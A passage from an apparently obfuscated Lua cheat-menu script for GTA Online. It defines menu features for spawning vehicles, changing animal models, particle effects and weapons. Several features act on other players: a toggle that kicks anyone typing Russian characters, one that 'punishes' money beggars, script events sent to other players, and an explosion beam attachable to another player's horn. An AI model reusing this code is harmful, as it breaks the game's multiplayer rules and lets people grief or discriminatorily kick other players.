    V["chat_log"] =
        aG(
        "Chat-Log",
        U["chat"],
        function(aO)
            h["chat_log"] = aO.on
        end
    )
    V["chat_log"].on = h["chat_log"]
    V["chat_russki"] =
        aG(
        "Kick if Russki Char is typed",
        U["chat"],
        function(aO)
            h["chat_russki"] = aO.on
        end
    )
    V["chat_russki"].on = h["chat_russki"]
    V["chat_begger"] =
        aG(
        "Punish Money Beggers",
        U["chat"],
        function(aO)
            h["chat_begger"] = aO.on
        end
    )
    V["chat_begger"].on = h["chat_begger"]
    V["send_msg_to_script_users"] =
        aF(
        "Send Message to 2Take1Script-Users",
        U["chat"],
        function()
            local aQ, co = input.get("Enter Message", "", 128, 0)
            while aQ == 1 do
                system.wait(0)
                aQ, co = input.get("Enter Message", "", 128, 0)
            end
            if aQ == 2 then
                return HANDLER_POP
            end
            if co ~= "" then
                local cm = {}
                cm[1] = 6666
                for a, m in utf8.codes(co) do
                    cm[#cm + 1] = m
                end
                for E = 0, 31 do
                    if player.is_player_valid(E) then
                        if E ~= aV() and aA(E) ~= -1 then
                            aU(0xfaaab4a3, E, cm)
                        end
                    end
                end
            end
        end
    )
    V["chat_cmd"] =
        aG(
        "Enable Chat-Commands",
        U["chat"],
        function(aO)
            h["chat_cmd"] = aO.on
        end
    )
    V["chat_cmd"].on = h["chat_cmd"]
    U["chat_cmd"] = aC("Chat-Commands", U["chat"]).id
    for E = 1, #w do
        V[w[E][1]] =
            aG(
            w[E][2],
            U["chat_cmd"],
            function(aO)
                h[w[E][1]] = aO.on
            end
        )
        V[w[E][1]].on = h[w[E][1]]
    end
    aF("[SU] = Script-User", U["chat_cmd"])
    aF(
        "Delete Vehicles from !lag",
        U["chat"],
        function()
            b1(T["lag_area"])
            T["lag_area"] = {}
        end
    )
    V["chat_cmd_friends"] =
        aG(
        "Chat Commands for Friends",
        U["chat"],
        function(aO)
            h["chat_cmd_friends"] = aO.on
        end
    )
    V["chat_cmd_friends"].on = h["chat_cmd_friends"]
    V["chat_cmd_all"] =
        aG(
        "Chat Commands Everyone",
        U["chat"],
        function(aO)
            h["chat_cmd_all"] = aO.on
        end
    )
    V["chat_cmd_all"].on = h["chat_cmd_all"]
    U["custom_veh"] = aC("Custom Vehicles", U["parent"])
    U["custom_veh"].hidden = h["custom_vehicles_hidden"]
    U["custom_veh"] = U["custom_veh"].id
    V["spawn_preview"] =
        aG(
        "Preview Custom Vehicles",
        U["custom_veh"],
        function(aO)
            if #T["preview_veh"] > 0 and aO.on then
                if ped.is_ped_in_any_vehicle(aX()) then
                    ped.clear_ped_tasks_immediately(aX())
                end
                local bc = a_()
                if not a4 then
                    for E = 1, #T["preview_veh"] do
                        entity.set_entity_no_collsion_entity(T["preview_veh"][E], aX(), true)
                    end
                    a4 = true
                end
                bc.z = bc.z + a3
                local bQ = aY()
                bc = bP(bc, bQ, a5)
                b0(T["preview_veh"][1], bc)
                entity.set_entity_rotation(T["preview_veh"][1], a6)
                a6.z = a6.z + 1
                if a6.z > 360 then
                    a6.z = 0
                end
            end
            if not aO.on then
                b1(T["preview_veh"])
                T["preview_veh"] = {}
                a4 = false
                return HANDLER_POP
            end
            return aN(aO)
        end
    )
    for E = 1, #J do
        aF(
            J[E][1],
            U["custom_veh"],
            function()
                local bE = J[E][2]
                n("Attempt to spawn Custom Vehicle.")
                menu.set_menu_can_navigate(false)
                temp_veh = {}
                local bc = v3()
                local d2 = v3()
                local d3 = 0
                local d4 = 0
                local bQ = 0
                local d5 = false
                local d6 = ped.get_vehicle_ped_is_using(aX())
                if V["spawn_preview"].on and T["preview_veh"][1] ~= nil then
                    b1(T["preview_veh"])
                    T["preview_veh"] = {}
                    a4 = false
                    system.yield(250)
                end
                for E = 1, #bE[1] do
                    aR(bE[1][E], 7500)
                end
                for E = 2, #bE do
                    bc = a_()
                    if bE[E][6] ~= nil and E == 2 then
                        bc.z = bc.z + bE[E][6]
                    end
                    if E > 2 then
                        bc.z = bc.z + 25
                    end
                    if
                        V["use_own_veh"].on and E == 2 and entity.get_entity_model_hash(d6) == bE[E][1] or
                            bE[2][1] == 0 and E == 2 and V["use_own_veh"].on and d6 ~= 0
                     then
                        n("Detected Own Vehicle, using it.")
                        temp_veh[E - 1] = d6
                        d5 = true
                    elseif bE[2][1] == 0 and not V["use_own_veh"].on then
                        n("Failed at spawning Custom Vehicle.")
                        k("No Vehicle found, get in a valid Vehicle")
                        menu.set_menu_can_navigate(true)
                        return
                    else
                        if streaming.is_model_a_vehicle(bE[E][1]) then
                            if E == 2 then
                                bQ = aY()
                                if bE[E][11] ~= nil then
                                    a5 = bE[E][11]
                                else
                                    a5 = 5
                                end
                                if bE[E][12] ~= nil then
                                    a3 = bE[E][12]
                                else
                                    a3 = 1
                                end
                                bc = bP(bc, bQ, a5)
                            end
                            temp_veh[E - 1] = vehicle.create_vehicle(bE[E][1], bc, bQ, true, false)
                            decorator.decor_set_int(temp_veh[E - 1], "MPBitset", 1 << 10)
                            local d7 = math.random(0, 16777215)
                            if bE[E][4] ~= nil then
                                d7 = bE[E][4][1]
                            end
                            vehicle.set_vehicle_custom_primary_colour(temp_veh[E - 1], d7)
                            if bE[E][4] ~= nil then
                                d7 = bE[E][4][2]
                            end
                            vehicle.set_vehicle_custom_secondary_colour(temp_veh[E - 1], d7)
                            if bE[E][4] ~= nil then
                                d7 = bE[E][4][3]
                            end
                            vehicle.set_vehicle_custom_pearlescent_colour(temp_veh[E - 1], d7)
                            if bE[E][4] ~= nil then
                                d7 = bE[E][4][4]
                            end
                            vehicle.set_vehicle_custom_wheel_colour(temp_veh[E - 1], d7)
                            d7 = math.random(0, 4)
                            if bE[E][4] ~= nil then
                                d7 = bE[E][4][5]
                            end
                            vehicle.set_vehicle_window_tint(temp_veh[E - 1], d7)
                            if streaming.is_model_a_plane(bE[E][1]) and E > 2 then
                                vehicle.control_landing_gear(temp_veh[E - 1], 3)
                            end
                        else
                            temp_veh[E - 1] = object.create_object(bE[E][1], bc, true, false)
                        end
                    end
                    if E > 2 then
                        bc.z = bc.z - 25
                    end
                    if V["set_godmode"].on then
                        entity.set_entity_god_mode(temp_veh[E - 1], true)
                    end
                    if bE[E][5] then
                        entity.set_entity_visible(temp_veh[E - 1], false)
                    end
                    if bE[E][13] then
                        entity.set_entity_alpha(temp_veh[E - 1], bE[E][13], false)
                    end
                    if E > 2 then
                        d3 = 0
                        if bE[E][7] ~= nil then
                            d3 = bE[E][7]
                        end
                        d4 = temp_veh[1]
                        if bE[E][8] ~= nil then
                            d4 = temp_veh[bE[E][8]]
                        end
                        local d8 = bE[E][10]
                        if d8 == true then
                            entity.set_entity_collision(temp_veh[E - 1], false, false, false)
                        else
                            d8 = false
                        end
                        bc = v3()
                        if bE[E][2] ~= nil then
                            bc = bB(bE[E][2])
                        end
                        d2 = v3()
                        if bE[E][3] ~= nil then
                            d2 = bB(bE[E][3])
                        end
                        if bE[E][1] ~= 0 then
                            entity.attach_entity_to_entity(
                                temp_veh[E - 1],
                                d4,
                                d3,
                                bc,
                                d2,
                                false,
                                not d8,
                                false,
                                2,
                                true
                            )
                        end
                        if bE[E][9] ~= nil then
                            local d9
                            aR(bE[E][9])
                            bc = a_()
                            d9 = ped.create_ped(6, bE[E][9], bc, 0.0, true, false)
                            system.wait(0)
                            if V["set_godmode"].on then
                                ped.set_ped_max_health(d9, 25000000.0)
                                ped.set_ped_health(d9, 25000000.0)
                                ped.set_ped_can_ragdoll(d9, false)
                                entity.set_entity_god_mode(d9, true)
                            end
                            aT(bE[E][9])
                            if bE[E][1] ~= 0 then
                                ped.set_ped_into_vehicle(d9, temp_veh[E - 1], -1)
                                vehicle.set_vehicle_doors_locked(temp_veh[E - 1], 2)
                            else
                                bc = v3()
                                if bE[E][2] ~= nil then
                                    bc = bB(bE[E][2])
                                end
                                d2 = v3()
                                if bE[E][3] ~= nil then
                                    d2 = bB(bE[E][3])
                                end
                                entity.attach_entity_to_entity(d9, d4, d3, bc, d2, false, not d8, true, 2, true)
                            end
                        end
                    end
                    if V["spawn_preview"].on then
                        T["preview_veh"][#T["preview_veh"] + 1] = temp_veh[E - 1]
                    else
                        T["custom_veh"][#T["custom_veh"] + 1] = temp_veh[E - 1]
                    end
                end
                if not V["spawn_preview"].on then
                    if V["auto_get_in"].on then
                        ped.set_ped_into_vehicle(aX(), temp_veh[1], -1)
                    end
                end
                if not d5 then
                    bM(temp_veh[1])
                end
                for E = 1, #bE[1] do
                    aT(bE[1][E])
                end
                menu.set_menu_can_navigate(true)
                n("Spawn Custom Vehicle Done.")
            end
        )
    end
    aF(
        "Delete Custom Vehicles",
        U["custom_veh"],
        function()
            n("Clearing Custom Vehicles.")
            b1(T["custom_veh"])
            T["custom_veh"] = {}
            b1(T["preview_veh"])
            T["preview_veh"] = {}
            a4 = false
            k("Cleared Custom Vehicles.")
        end
    )
    U["exp_beam"] = aC("Explosive Beam on Horn", U["parent"])
    U["exp_beam"].hidden = h["explosive_beam_hidden"]
    U["exp_beam"] = U["exp_beam"].id
    V["exp_beam"] =
        aG(
        "Enable Beam on Horn",
        U["exp_beam"],
        function(aO)
            h["exp_beam"] = aO.on
            if aO.on then
                local da = aV()
                if aA(V["exp_beam_other"].value_i) ~= -1 then
                    da = V["exp_beam_other"].value_i
                end
                local d0 = aW(da)
                local bd, bc, db, dc, dd
                local de = v3()
                local df, dg, dh, di, dj, dk
                if player.is_player_pressing_horn(da) then
                    bd = ped.get_vehicle_ped_is_using(d0)
                    for E = 0, 5 do
                        bc = aZ(bd)
                        system.yield(5)
                        if E > 0 then
                            db = aZ(bd)
                            de.x = db.x - bc.x
                            de.y = db.y - bc.y
                            de.z = db.z - bc.z
                            if de.x ~= 0 and de.y ~= 0 and de.z ~= 0 then
                                dc = 1 / (de.x * de.x + de.y * de.y + de.z * de.z) ^ 0.5
                                dd = math.random(h["exp_beam_min"], h["exp_beam_max"])
                                db.x = db.x + dd * dc * de.x
                                db.y = db.y + dd * dc * de.y
                                db.z = db.z + dd * dc * de.z
                                df = math.floor(db.x - h["exp_beam_radius"])
                                dg = math.floor(db.x + h["exp_beam_radius"])
                                dh = math.floor(db.y - h["exp_beam_radius"])
                                di = math.floor(db.y + h["exp_beam_radius"])
                                dj = math.floor(db.z - h["exp_beam_radius"])
                                dk = math.floor(db.z + h["exp_beam_radius"])
                                db.x = math.random(df, dg)
                                db.y = math.random(dh, di)
                                db.z = math.random(dj, dk)
                                fire.add_explosion(db, h["exp_beam_type"], true, false, 0.1, d0)
                                db.x = math.random(df, dg)
                                db.y = math.random(dh, di)
                                db.z = math.random(dj, dk)
                                fire.add_explosion(db, h["exp_beam_type_2"], true, false, 0.1, d0)
                            end
                        end
                    end
                end
            end
            return aN(aO)
        end
    )
    V["exp_beam"].on = h["exp_beam"]
    V["exp_beam_type"] =
        aH(
        "Select Explosion",
        "action_value_i",
        U["exp_beam"],
        function()
            h["exp_beam_type"] = V["exp_beam_type"].value_i
            k("Beam Explosion Type 1: " .. h["exp_beam_type"])
        end
    )
    V["exp_beam_type"].max_i = 74
    V["exp_beam_type"].min_i = 0
    V["exp_beam_type"].value_i = h["exp_beam_type"]
    V["exp_beam_type_2"] =
        aH(
        "Select Explosion 2",
        "action_value_i",
        U["exp_beam"],
        function()
            h["exp_beam_type_2"] = V["exp_beam_type_2"].value_i
            k("Beam Explosion Type 2: " .. h["exp_beam_type_2"])
        end
    )
    V["exp_beam_type_2"].max_i = 74
    V["exp_beam_type_2"].min_i = 0
    V["exp_beam_type_2"].value_i = h["exp_beam_type_2"]
    V["exp_beam_radius"] =
        aH(
        "Select Scattering",
        "action_value_i",
        U["exp_beam"],
        function()
            h["exp_beam_radius"] = V["exp_beam_radius"].value_i
            k("Beam Radius: " .. h["exp_beam_radius"])
        end
    )
    V["exp_beam_radius"].max_i = 10
    V["exp_beam_radius"].min_i = 1
    V["exp_beam_radius"].value_i = h["exp_beam_radius"]
    V["exp_beam_min"] =
        aH(
        "Select Min Range",
        "action_value_i",
        U["exp_beam"],
        function()
            h["exp_beam_min"] = V["exp_beam_min"].value_i
            k("Beam Min Range: " .. h["exp_beam_min"])
        end
    )
    V["exp_beam_min"].max_i = 100
    V["exp_beam_min"].min_i = 10
    V["exp_beam_min"].value_i = h["exp_beam_min"]
    V["exp_beam_min"].mod_i = 5
    V["exp_beam_max"] =
        aH(
        "Select Max Range",
        "action_value_i",
        U["exp_beam"],
        function()
            h["exp_beam_max"] = V["exp_beam_max"].value_i
            k("Beam Max Range: " .. h["exp_beam_max"])
        end
    )
    V["exp_beam_max"].max_i = 300
    V["exp_beam_max"].min_i = 100
    V["exp_beam_max"].value_i = h["exp_beam_max"]
    V["exp_beam_max"].mod_i = 5
    V["exp_beam_other"] =
        aH(
        "Enable Horn for Player",
        "action_value_i",
        U["exp_beam"],
        function()
            if aA(V["exp_beam_other"].value_i) ~= -1 then
                k("Selected Player: " .. az(V["exp_beam_other"].value_i))
            else
                k("Not a valid Player.")
            end
        end
    )
    V["exp_beam_other"].max_i = 31
    V["exp_beam_other"].min_i = -1
    V["exp_beam_other"].value_i = -1
    U["bac"] = aC("Better Animal Changer", U["parent"])
    U["bac"].hidden = h["animal_changer_hidden"]
    U["bac"] = U["bac"].id
    U["bac_ga"] = aC("Ground Animals", U["bac"]).id
    aF(
        "Bigfoot",
        U["bac_ga"],
        function()
            bm(0x61D4C771, nil, true, nil, true)
        end
    )
    aF(
        "Bigfoot 2",
        U["bac_ga"],
        function()
            bm(0xAD340F5A, nil, true, nil, true)
        end
    )
    aF(
        "Boar",
        U["bac_ga"],
        function()
            bm(0xCE5FF074)
        end
    )
    aF(
        "Cat",
        U["bac_ga"],
        function()
            bm(0x573201B8)
        end
    )
    aF(
        "Chimp",
        U["bac_ga"],
        function()
            bm(0xA8683715, nil, nil, true)
        end
    )
    aF(
        "Chop",
        U["bac_ga"],
        function()
            bm(0x14EC17EA, nil, true)
        end
    )
    aF(
        "Cow",
        U["bac_ga"],
        function()
            bm(0xFCFA9E1E)
        end
    )
    aF(
        "Coyote",
        U["bac_ga"],
        function()
            bm(0x644AC75E)
        end
    )
    aF(
        "Deer",
        U["bac_ga"],
        function()
            bm(0xD86B5A95)
        end
    )
    aF(
        "German Shepherd",
        U["bac_ga"],
        function()
            bm(0x431FC24C, nil, true)
        end
    )
    aF(
        "Hen",
        U["bac_ga"],
        function()
            bm(0x6AF51FAF)
        end
    )
    aF(
        "Husky",
        U["bac_ga"],
        function()
            bm(0x4E8F95A2, nil, true)
        end
    )
    aF(
        "Mountain Lion",
        U["bac_ga"],
        function()
            bm(0x1250D7BA, nil, true)
        end
    )
    aF(
        "Pig",
        U["bac_ga"],
        function()
            bm(0xB11BAB56)
        end
    )
    aF(
        "Poodle",
        U["bac_ga"],
        function()
            bm(0x431D501C)
        end
    )
    aF(
        "Pug",
        U["bac_ga"],
        function()
            bm(0x6D362854)
        end
    )
    aF(
        "Rabbit",
        U["bac_ga"],
        function()
            bm(0xDFB55C81)
        end
    )
    aF(
        "Rat",
        U["bac_ga"],
        function()
            bm(0xC3B52966)
        end
    )
    aF(
        "Golden Retriever",
        U["bac_ga"],
        function()
            bm(0x349F33E1, nil, true)
        end
    )
    aF(
        "Rhesus",
        U["bac_ga"],
        function()
            bm(0xC2D06F53, nil, nil, true)
        end
    )
    aF(
        "Rottweiler",
        U["bac_ga"],
        function()
            bm(0x9563221D, nil, true)
        end
    )
    aF(
        "Westy",
        U["bac_ga"],
        function()
            bm(0xAD7844BB)
        end
    )
    U["bac_wa"] =
        aC(
        "Water Animals",
        U["bac"],
        function()
            k("Note that these Models will only work in Water!", 48)
        end
    ).id
    aF(
        "Dolphin",
        U["bac_wa"],
        function()
            bm(0x8BBAB455, true)
        end
    )
    aF(
        "Fish",
        U["bac_wa"],
        function()
            bm(0x2FD800B7, true)
        end
    )
    aF(
        "Hammershark",
        U["bac_wa"],
        function()
            bm(0x3C831724, true)
        end
    )
    aF(
        "Humpback",
        U["bac_wa"],
        function()
            bm(0x471BE4B2, true)
        end
    )
    aF(
        "Killerwhale",
        U["bac_wa"],
        function()
            bm(0x8D8AC8B9, true)
        end
    )
    aF(
        "Shark",
        U["bac_wa"],
        function()
            bm(0x06C3F072, true, true)
        end
    )
    aF(
        "Stingray",
        U["bac_wa"],
        function()
            bm(0xA148614D, true)
        end
    )
    U["bac_fa"] = aC("Flying Animals", U["bac"]).id
    aF(
        "Cormorant",
        U["bac_fa"],
        function()
            bm(0x56E29962)
        end
    )
    aF(
        "Chickenhawk",
        U["bac_fa"],
        function()
            bm(0xAAB71F62)
        end
    )
    aF(
        "Crow",
        U["bac_fa"],
        function()
            bm(0x18012A9F)
        end
    )
    aF(
        "Pigeon",
        U["bac_fa"],
        function()
            bm(0x06A20728)
        end
    )
    aF(
        "Seagull",
        U["bac_fa"],
        function()
            bm(0xD3939DFD)
        end
    )
    U["bac_sm"] = aC("Standard Models", U["bac"]).id
    aF(
        "Franklin",
        U["bac_sm"],
        function()
            bm(0x9B22DBAF, nil, nil, nil, true)
        end
    )
    aF(
        "Michael",
        U["bac_sm"],
        function()
            bm(0x0D7114C9, nil, nil, nil, true)
        end
    )
    aF(
        "Trevor",
        U["bac_sm"],
        function()
            bm(0x9B810FA2, nil, nil, nil, true)
        end
    )
    aF(
        "MP Female",
        U["bac_sm"],
        function()
            bm(0x9C9EFFD8, nil, true, nil, true)
        end
    )
    aF(
        "MP Male",
        U["bac_sm"],
        function()
            bm(0x705E61F2, nil, true, nil, true)
        end
    )
    V["bl_mdl_change"] =
        aG(
        "Safe Model Change",
        U["bac"],
        function(aO)
            h["bl_mdl_change"] = aO.on
        end
    )
    V["bl_mdl_change"].on = h["bl_mdl_change"]
    aF(
        "Fix endless loading Screen",
        U["bac"],
        function()
            bm(0x9B22DBAF, nil, nil, nil, true)
            system.wait(100)
            ped.set_ped_health(aX(), 0)
        end
    )
    U["ptfx"] = aC("PTFX", U["parent"])
    U["ptfx"].hidden = h["ptfx_hidden"]
    U["ptfx"] = U["ptfx"].id
    V["sparkling_ass"] =
        aG(
        "Sparkling Ass",
        U["ptfx"],
        function(aO)
            if aO.on then
                graphics.set_next_ptfx_asset("scr_indep_fireworks")
                while not graphics.has_named_ptfx_asset_loaded("scr_indep_fireworks") do
                    graphics.request_named_ptfx_asset("scr_indep_fireworks")
                    system.wait(0)
                end
                graphics.start_networked_particle_fx_non_looped_at_coord(
                    "scr_indep_firework_trail_spawn",
                    a_(),
                    v3(60, 0, 0),
                    0.33,
                    true,
                    true,
                    true
                )
                system.wait(25)
            end
            h["sparkling_ass"] = aO.on
            return aN(aO)
        end
    )
    V["sparkling_ass"].on = h["sparkling_ass"]
    V["sparkling_tires"] =
        aG(
        "Sparkling Tires (WIP)",
        U["ptfx"],
        function(aO)
            if aO.on then
                local bd = ped.get_vehicle_ped_is_using(aX())
                if bd ~= 0 then
                    local dl = {"wheel_lf", "wheel_rf", "wheel_lr", "wheel_rr"}
                    for E = 1, #dl do
                        aR(1803116220)
                        local dm = object.create_object(1803116220, a_(), true, false)
                        entity.set_entity_collision(dm, false, false, false)
                        entity.set_entity_visible(dm, false)
                        local bY = E
                        if menu.get_version() ~= "2.4.2" then
                            bY = entity.get_entity_bone_index_by_name(bd, dl[E])
                        end
                        entity.attach_entity_to_entity(dm, bd, bY, v3(), v3(), true, true, false, 0, true)
                        graphics.set_next_ptfx_asset("scr_indep_fireworks")
                        while not graphics.has_named_ptfx_asset_loaded("scr_indep_fireworks") do
                            graphics.request_named_ptfx_asset("scr_indep_fireworks")
                            system.wait(0)
                        end
                        graphics.start_networked_particle_fx_non_looped_at_coord(
                            "scr_indep_firework_trail_spawn",
                            aZ(dm),
                            v3(60, 0, 0),
                            0.5,
                            true,
                            true,
                            true
                        )
                        aP(dm, 5)
                        entity.detach_entity(dm)
                        entity.set_entity_velocity(dm, v3())
                        b0(dm, v3(8000, 8000, -1000))
                        entity.delete_entity(dm)
                    end
                    aT(1803116220)
                    system.wait(25)
                end
            end
            h["sparkling_tires"] = aO.on
            return aN(aO)
        end
    )
    V["sparkling_tires"].on = h["sparkling_tires"]
    V["smoke_area"] =
        aG(
        "Smoke Area",
        U["ptfx"],
        function(aO)
            if aO.on then
                for E = 1, 16 do
                    local bc = a_()
                    local dn = 2 * math.pi
                    dn = dn / 16
                    dn = dn * E
                    bc.x = bc.x + 18 * math.cos(dn)
                    bc.y = bc.y + 18 * math.sin(dn)
                    bc.z = bc.z - 2.5
                    graphics.set_next_ptfx_asset("scr_recartheft")
                    while not graphics.has_named_ptfx_asset_loaded("scr_recartheft") do
                        graphics.request_named_ptfx_asset("scr_recartheft")
                        system.wait(0)
                    end
                    graphics.start_networked_particle_fx_non_looped_at_coord(
                        "scr_wheel_burnout",
                        bc,
                        v3(),
                        2.5,
                        true,
                        true,
                        true
                    )
                    system.wait(40)
                end
            end
            h["smoke_area"] = aO.on
            return aN(aO)
        end
    )
    V["smoke_area"].on = h["smoke_area"]
    V["fire_circle"] =
        aG(
        "Fire Circle",
        U["ptfx"],
        function(aO)
            if aO.on then
                if av["fire_balls"][1] == nil then
                    for E = 1, 48 do
                        aR(1803116220)
                        av["fire_balls"][E] = object.create_object(1803116220, a_(), true, false)
                        entity.set_entity_collision(av["fire_balls"][E], false, false, false)
                        entity.set_entity_visible(av["fire_balls"][E], false)
                    end
                    aT(1803116220)
                end
                for E = 1, 48 do
                    local bc = a_()
                    local dn = 2 * math.pi
                    dn = dn / 48
                    dn = dn * math.random(1, 64)
                    bc.x = bc.x + 10 * math.cos(dn)
                    bc.y = bc.y + 10 * math.sin(dn)
                    bc.z = bc.z - 1.5
                    b0(av["fire_balls"][E], bc)
                end
                system.wait(10)
                if av["fire_circle"][1] == nil then
                    for E = 1, 48 do
                        graphics.set_next_ptfx_asset("weap_xs_vehicle_weapons")
                        while not graphics.has_named_ptfx_asset_loaded("weap_xs_vehicle_weapons") do
                            graphics.request_named_ptfx_asset("weap_xs_vehicle_weapons")
                            system.wait(0)
                        end
                        av["fire_circle"][E] =
                            graphics.start_ptfx_looped_on_entity(
                            "muz_xs_turret_flamethrower_looping",
                            av["fire_balls"][E],
                            v3(),
                            v3(90, 0, 0),
                            1
                        )
                    end
                end
            end
            if not aO.on then
                b1(av["fire_balls"])
                av["fire_balls"] = {}
                if av["fire_circle"][1] ~= nil then
                    for E = 1, #av["fire_circle"] do
                        graphics.remove_particle_fx(av["fire_circle"][E], true)
                    end
                    av["fire_circle"] = {}
                end
            end
            return aN(aO)
        end
    )
    V["fire_circle"].on = h["fire_circle"]
    V["fire_fart"] =
        aH(
        "Fire Fart",
        "action_value_i",
        U["ptfx"],
        function(aO)
            h["fire_fart"] = V["fire_fart"].value_i
            local bd = ped.get_vehicle_ped_is_using(aX())
            if bd ~= 0 then
                k("Fire Fart in a vehicle is too dangerous, get out!", 162)
            else
                local cb = 0x187D938D
                local dp = "weap_xs_vehicle_weapons"
                local dq = "muz_xs_turret_flamethrower_looping"
                aR(cb)
                local bQ = player.get_player_heading(aV())
                local cc = vehicle.create_vehicle(cb, a_(), bQ, true, false)
                aP(cc)
                entity.set_entity_visible(cc, false)
                aT(cb)
                decorator.decor_set_int(cc, "MPBitset", 1 << 10)
                ped.set_ped_into_vehicle(aX(), cc, -1)
                system.wait(500)
                graphics.set_next_ptfx_asset(dp)
                while not graphics.has_named_ptfx_asset_loaded(dp) do
                    graphics.request_named_ptfx_asset(dp)
                    system.wait(0)
                end
                local dr = aO.value_i
                local fire = graphics.start_ptfx_looped_on_entity(dq, aX(), v3(), v3(180, 0, 0), dr * 0.1)
                local bc = aZ(cc)
                local d2 = entity.get_entity_rotation(cc)
                local ds = d2
                ds:transformRotToDir()
                ds = ds * 1 * dr
                ds.z = bc.z + 0.6666666 * dr
                local dt = ds
                entity.set_entity_velocity(cc, dt)
                system.wait(250 * dr)
                graphics.remove_particle_fx(fire, true)
                while ped.is_ped_in_any_vehicle(aX()) do
                    ai.task_leave_vehicle(aX(), cc, 16)
                    system.wait(25)
                end
                b1({cc})
            end
        end
    )
    V["fire_fart"].max_i = 16
    V["fire_fart"].min_i = 4
    V["fire_fart"].value_i = h["fire_fart"]
    V["fire_ass"] =
        aG(
        "Fire Ass",
        U["ptfx"],
        function(aO)
            h["fire_ass"] = aO.on
            if aO.on then
                if av["fire_ass_ball"] == nil then
                    aR(1803116220)
                    av["fire_ass_ball"] = object.create_object(1803116220, a_(), true, false)
                    entity.set_entity_collision(av["fire_ass_ball"], false, false, false)
                    entity.set_entity_visible(av["fire_ass_ball"], false)
                    aT(1803116220)
                end
                if av["fire_ass"] == nil then
                    local dp = "weap_xs_vehicle_weapons"
                    local dq = "muz_xs_turret_flamethrower_looping"
                    graphics.set_next_ptfx_asset(dp)
                    while not graphics.has_named_ptfx_asset_loaded(dp) do
                        graphics.request_named_ptfx_asset(dp)
                        system.wait(0)
                    end
                    av["fire_ass"] = graphics.start_ptfx_looped_on_entity(dq, aX(), v3(), v3(180, 0, 0), 0.333)
                end
                local bc = a_()
                b0(av["fire_ass_ball"], a_())
            end
            if not aO.on then
                graphics.remove_particle_fx(av["fire_ass"], true)
                av["fire_ass"] = nil
                b1({av["fire_ass_ball"]})
                av["fire_ass_ball"] = nil
            end
            return aN(aO)
        end
    )
    V["fire_ass"].on = h["fire_ass"]
    U["misc"] = aC("Miscellaneous", U["parent"])
    U["misc"].hidden = h["misc_hidden"]
    U["misc"] = U["misc"].id
    U["weapon"] = aC("Weapon-Features", U["misc"]).id
    V["load_weapons"] =
        aG(
        "Load Weapons",
        U["weapon"],
        function(aO)
            if aO.on then
                local time = utils.time_ms() + 500
                while aO.on do
                    system.wait(0)
                    if time < utils.time_ms() then
                        break
                    end
                end
                local du = weapon.get_all_weapon_hashes()
                for E = 1, #du do
                    if weapon.has_ped_got_weapon(aX(), du[E]) then
                        local dv = false
                        for cE = 1, #S do
                            if du[E] == S[cE][1] then
                                dv = true
                            end
                        end
                        if not dv then
                            weapon.remove_weapon_from_ped(aX(), du[E])
                        end
                    end
                end
                for E = 1, #S do
                    if not weapon.has_ped_got_weapon(aX(), S[E][1]) then
                        weapon.give_delayed_weapon_to_ped(aX(), S[E][1], 0, 0)
                    end
                end
                for E = 1, #S do
                    for cH = 2, #S[E] do
                        if not weapon.has_ped_got_weapon_component(aX(), S[E][1], S[E][cH]) then
                            for cQ = 2, #S[E] do
                                weapon.give_weapon_component_to_ped(aX(), S[E][1], S[E][cQ])
                            end
                            weapon.set_ped_ammo(aX(), S[E][1], 9999)
                        end
                    end
                end
            end
            h["load_weapons"] = aO.on
            return aN(aO)
        end
    )
    V["load_weapons"].on = h["load_weapons"]
    U["flamethrower"] = aC("Flamethrower", U["weapon"]).id
    V["flamethrower_scale"] =
        aH(
        "Scale",
        "autoaction_value_i",
        U["flamethrower"],
        function()
            h["flamethrower_scale"] = V["flamethrower_scale"].value_i
        end
    )
    V["flamethrower_scale"].min_i = 1
    V["flamethrower_scale"].max_i = 25
    V["flamethrower_scale"].value_i = h["flamethrower_scale"]
    V["flamethrower"] =
        aG(
        "Flamethrower",
        U["flamethrower"],
        function(aO)
            if aO.on then
                if player.is_player_free_aiming(aV()) then
                    graphics.set_next_ptfx_asset("weap_xs_vehicle_weapons")
                    while not graphics.has_named_ptfx_asset_loaded("weap_xs_vehicle_weapons") do
                        graphics.request_named_ptfx_asset("weap_xs_vehicle_weapons")
                        system.wait(0)
                    end
                    if av["alien"] == nil then
                        aR(1803116220)
                        av["alien"] = object.create_object(1803116220, a_(), true, false)
                        entity.set_entity_collision(av["alien"], false, false, false)
                        entity.set_entity_visible(av["alien"], false)
                        aT(1803116220)
                    end
                    local dw, dx = ped.get_ped_bone_coords(aX(), 0xdead, v3())
                    while not dw do
                        system.wait(0)
                        dw, dx = ped.get_ped_bone_coords(aX(), 0xdead, v3())
                    end
                    b0(av["alien"], dx)
                    entity.set_entity_rotation(av["alien"], cam.get_gameplay_cam_rot())
                    if av["flamethrower"] == nil then
                        av["flamethrower"] =
                            graphics.start_ptfx_looped_on_entity(
                            "muz_xs_turret_flamethrower_looping",
                            av["alien"],
                            v3(),
                            v3(),
                            h["flamethrower_scale"]
                        )
                        graphics.set_particle_fx_looped_scale(av["flamethrower"], h["flamethrower_scale"])
                    end
                else
                    if av["flamethrower"] ~= nil then
                        graphics.remove_particle_fx(av["flamethrower"], true)
                        av["flamethrower"] = nil
                        b1({av["alien"]})
                        av["alien"] = nil
                    end
                end
            end
            if not aO.on then
                if av["flamethrower"] ~= nil then
                    graphics.remove_particle_fx(av["flamethrower"], true)
                    av["flamethrower"] = nil
                    b1({av["alien"]})
                    av["alien"] = nil
                end
            end
            h["flamethrower"] = aO.on
            return aN(aO)
        end
    )
    V["flamethrower"].on = h["flamethrower"]
    V["flamethrower_green"] =
        aG(
        "Flamethrower - Green",
        U["flamethrower"],
        function(aO)
            if aO.on then
                if player.is_player_free_aiming(aV()) then
                    graphics.set_next_ptfx_asset("weap_xs_vehicle_weapons")
                    while not graphics.has_named_ptfx_asset_loaded("weap_xs_vehicle_weapons") do
                        graphics.request_named_ptfx_asset("weap_xs_vehicle_weapons")
                        system.wait(0)
                    end
                    if av["alien"] == nil then
                        aR(1803116220)
                        av["alien"] = object.create_object(1803116220, a_(), true, false)
                        entity.set_entity_collision(av["alien"], false, false, false)
                        entity.set_entity_visible(av["alien"], false)
                        aT(1803116220)
                    end
                    local dw, dx = ped.get_ped_bone_coords(aX(), 0xdead, v3())
                    while not dw do
                        system.wait(0)
                        dw, dx = ped.get_ped_bone_coords(aX(), 0xdead, v3())
                    end
                    b0(av["alien"], dx)
                    entity.set_entity_rotation(av["alien"], cam.get_gameplay_cam_rot())
                    if av["flamethrower_green"] == nil then
                        av["flamethrower_green"] =
